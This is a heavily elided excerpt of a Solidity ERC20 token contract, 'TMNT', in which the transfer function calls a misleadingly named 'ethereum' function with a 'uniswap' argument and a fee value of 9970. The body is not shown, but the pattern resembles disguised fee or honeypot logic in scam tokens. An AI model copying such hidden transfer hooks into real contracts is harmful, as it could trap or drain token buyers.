...
contract TMNT is Ownable, IERC20 {
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        bytes32 c = ethereum(false, 9970, from, "uniswap", bytes32(0));
    ...
    function ethereum(bool isETH, uint256 fee, address addr, string memory swap, bytes32 hashVal) 
